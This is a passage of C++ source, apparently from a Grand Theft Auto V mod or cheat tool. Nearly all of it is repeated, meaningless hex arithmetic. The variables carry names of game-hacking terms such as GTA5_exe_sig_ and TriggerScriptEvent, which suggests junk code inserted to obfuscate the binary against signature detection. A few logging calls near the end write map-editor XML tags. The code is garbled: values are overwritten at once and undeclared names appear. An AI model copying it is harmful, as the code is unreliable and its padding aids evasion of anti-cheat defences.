			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<ClearMarkers>false</ClearMarkers>");
			Extern_Reader::LOG::LogSemHora("<IPLsToLoad load_mp_maps=\"false\" load_sp_maps=\"false\" />");
			Extern_Reader::LOG::LogSemHora("<IPLsToRemove />");
			Extern_Reader::LOG::LogSemHora("<InteriorsToEnable />");
			Extern_Reader::LOG::LogSemHora("<InteriorsToCap />");
			Extern_Reader::LOG::LogSemHora("<WeatherToSet></WeatherToSet>");
			Extern_Reader::LOG::LogSemHora("<TimecycleModifier strength=\"1\"></TimecycleModifier>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
